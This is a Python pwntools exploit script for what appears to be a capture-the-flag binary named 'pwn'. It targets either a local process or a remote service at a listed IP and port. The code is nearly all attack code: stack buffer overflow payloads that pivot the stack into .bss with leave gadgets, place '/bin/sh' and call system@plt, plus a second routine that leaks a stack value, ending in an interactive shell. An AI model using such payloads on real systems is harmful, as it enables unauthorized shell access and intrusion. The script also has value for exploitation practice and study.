from pwn import *
LOCAL = 1
DEBUG = 1
if DEBUG:
    context.log_level = 'debug'
if LOCAL:
    p = process('./pwn')#,env={'LD_PRELOAD':'./ld-2.29.so'})
    #libc = ELF('./libc-2.29.so')
else:
    p = remote('111.198.29.45',32003)
    #libc = ELF('./libc-2.29.so')

main = 0x8048595
bss = 0x0804A100
leave = 0x08048561
elf = ELF("./pwn")
system_plt = elf.plt["system"]
def exp():
	payload = "a"*40 + p32(bss) + p32(0x080485B1) + p32(0xeeeeee)
	
	gdb.attach(p,"b *0x080485B1")
	
	p.recv()
	p.send("a"*40 + p32(bss) + p32(0x804854B))
	p.recv()
	p.send(payload)
	payload2 = "/bin/sh\x00" + p32(0x804a0e4) + p32(system_plt) + p32(0) + p32(bss-0x28)
	payload2 = payload2.ljust(40,"\x00") 
	payload2 += p32(0x804a0e0) + p32(leave)
	p.recv()
	p.send(payload2)
	sleep(0.5)
	p.send(payload2)

def exp2():
	payload = "a"*44  + p32(0x80485BE)
	p.recv()
	gdb.attach(p)
	p.send(payload)
	p.recvuntil("a"*44)
	p.recvn(4)
	data = u32(p.recvn(4))
	print hex(data)
	p.recv()
exp2()
p.interactive()
